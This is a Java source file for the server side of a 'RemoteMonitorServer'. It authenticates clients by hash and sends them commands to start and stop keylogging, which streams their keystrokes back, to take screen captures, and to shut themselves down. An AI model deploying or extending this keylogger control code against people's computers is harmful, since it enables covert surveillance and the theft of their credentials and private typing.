package net;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;

import main.RemoteMonitorServer;

/**
 * Manages the connection between a client and the server
 * @author Caleb Choi
 */
class Connection implements Runnable {

	private Socket connection;
	private String clientAddress;
	private String clientHostName;
	private String hash;

	private InputStreamReader input;
	private DataOutputStream output;

	private Thread operation;

	/**
	 * Initializes the connection with the client. Authentication and communication
	 * will not occur here, but must be run through a new thread
	 * @param connection Socket connection with client
	 * @param hash Client authentication hash
	 * @throws IOException
	 */
	public Connection(Socket connection, String hash) throws IOException {
		this.connection = connection;
		this.clientAddress = this.connection.getInetAddress().getHostAddress();
		this.clientHostName = this.connection.getInetAddress().getHostName();
		this.hash = hash;

		input = new InputStreamReader(this.connection.getInputStream());
		output = new DataOutputStream(this.connection.getOutputStream());
		output.flush();
	}

	/**
	 * Returns the raw IP address of the connection in textual form
	 * @return IP address of the connection
	 */
	public String getAddress() {return clientAddress;}

	/**
	 * Returns the host name of the connected computer
	 * @return Host name of the connected computer
	 */
	@SuppressWarnings("unused") // This warning is dumb; this is used for the list
	public String getHostName() {return clientHostName;}

	/**
	 * Returns the IP address of the connection as an InetAddress
	 * @return IP address of the connection
	 */
	public InetAddress getInetAddress() {return connection.getInetAddress();} 

	/**
	 * Stops the current operation if there is one
	 */
	public void killOperation() {
		if (operation != null && !operation.isInterrupted()) {
			operation.interrupt();
			operation = null;
		}
	}

	/**
	 * Shuts down the connection to the client. Note that the client will not
	 * receive any forewarning, and the user will not be informed of any dialog
	 * that the connection has been cut. This method will also kill any currently
	 * running operations
	 */
	public void shutdown() {
		killOperation(); // Stops whatever they were doing
		System.out.println("CLIENT " + getAddress() + " DISCONNECTED");

		// Will try to close all output streams
		try {input.close();} catch (IOException e) {System.out.println(getAddress() + " INPUT STREAM FAILED TO CLOSE");}
		try {output.flush();} catch (IOException e) {System.out.println(getAddress() + " OUTPUT STREAM FAILED TO FLUSH");}
		try {output.close();} catch (IOException e) {System.out.println(getAddress() + " OUTPUT STREAM FAILED TO CLOSE");}
		try {connection.close();} catch (IOException e) {System.out.println(getAddress() + " SOCKET CONNECTION FAILED TO CLOSE");}

		// Removes connection from the server list
		System.out.println("REMOVE CONNECTION RESULT: " + RemoteMonitorServer.removeConnection(connection.getInetAddress()));
	}

	public boolean isConnectionDead() {
		try {
			output.writeBytes(PacketHeader.CONN + System.getProperty("line.separator"));
			return false;
		} catch (IOException ioe) {return true;}
	}

	/**
	 * Requests a client operation. If there is one in progress, the thread will be
	 * interrupted and cleared
	 * @param header Packet header to be sent
	 */
	public void requestOperation(final String header, final boolean forced) {

		// Kills any currently running operation
		if (operation != null)
			killOperation();

		if (header.equals(PacketHeader.KEYL)) { // Starts a new thread that listens for client keystrokes
			operation = new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						// Sends a request packet to the client to start keylogging functions
						output.writeBytes(header + System.getProperty("line.separator"));
						System.out.println("KEYLOG REQUEST SENT");

						// Keep listening until thread is interrupted
						BufferedReader bufferedInput = new BufferedReader(input);
						while (!Thread.currentThread().isInterrupted()) {
							if (input.ready()) {
								String keystroke = bufferedInput.readLine();
								System.out.print(keystroke);
								
								// Adds the logged key to the text area if that's still existant
								RemoteMonitorServer.addText(keystroke);
							}
						}

						// Once thread is interrupted, send message to client to stop recording keystrokes
						output.writeBytes(header + System.getProperty("line.separator"));
						System.out.println("KEYLOG DESIST SENT");
						operation = null;
						
					} catch (IOException e) { // IOException means the client disconnected
						shutdown(); 
						if (!forced) RemoteMonitorServer.displayConnectionCutDialog(connection.getInetAddress());
						operation = null;
					}
				}
			});
			operation.start();

		} else if (header.equals(PacketHeader.PICT)) { // Tells client to send a screencap over
			operation = new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						// Sends a request packet to the client to send a screen capture
						output.writeBytes(header + System.getProperty("line.separator"));

						while (!Thread.currentThread().isInterrupted()) {

						}
					} catch (IOException e) { // IOException means the client disconnected
						shutdown(); 
						RemoteMonitorServer.displayConnectionCutDialog(connection.getInetAddress());
					}
				}
			});
			operation.start();

		} else if (header.equals(PacketHeader.KILL)) { // Tells client to terminate its existence

			// Try to send a kill request to client
			try {output.writeBytes(header + System.getProperty("line.separator"));} 
			catch (IOException e) {System.out.println("KILL REQUEST WAS UNABLE TO BE SENT");}
			finally {shutdown();} // Regardless of whether the kill request was able to be sent, server closes client

		} else System.out.println("INVALID REQUEST HEADER - IGNORING REQUEST TO " + getAddress());
	}

	@Override
	public void run() {

		// Listens for the authentication packet
		while (true) {
			try {
				// If there is input to be read
				BufferedReader bufferedInput = new BufferedReader(input);
				if (input.ready()) {
					String[] authMessage = bufferedInput.readLine().split(" ");

					// Checks to see if the header and hash for authentication is valid
					if (authMessage[0].equals(PacketHeader.AUTH)) {
						System.out.println("AUTHENTICATION PACKET RECEIVED:" + clientAddress);

						// Check if the client hash matches
						if (authMessage[1].equals(hash)) {
							System.out.println("CLIENT HASH MATCHED");
							System.out.println(clientAddress + "  SUCCESSFULLY CONNECTED");
							break;

						} else { // If the hashes don't match, kill connection
							System.out.println("ERROR: HASH MISMATCH");
							throw new Exception("Hash mismatch");
						}

					} else { // If the header is invalid
						System.out.println("ERROR: INVALID AUTHENTICATION HEADER");
						throw new Exception("Invalid authentication header");
					}
				}
			} catch (Exception e) {
				System.out.println("EXITING THREAD");
				e.printStackTrace();
				try {
					shutdown();
					System.out.println("CONNECTION TERMINATED");
				} catch (Exception ex) {
					System.out.println("CONNECTION COULD NOT BE TERMINATED");}
				return;
			}
		}

		// Sends back a confirmation packet to the client
		try {
			output.writeBytes(PacketHeader.CONN + " " + hash + System.getProperty("line.separator"));
			System.out.println("CONFIRMATION PACKET SENT");
		} catch (IOException e) {
			System.out.println("CONFIRMATION PACKET COULD NOT BE SENT");
			try {
				shutdown();
				System.out.println("TERMINATING CONNECTION");
			} catch (Exception ex) {
				System.out.println("CONNECTION COULD NOT BE TERMINATED");}
			return;
		}
		System.out.println(RemoteMonitorServer.getConnectionList().size() + " Connected clients");

		// Updates the client list in the GUI
		RemoteMonitorServer.updateClientList();
	}
}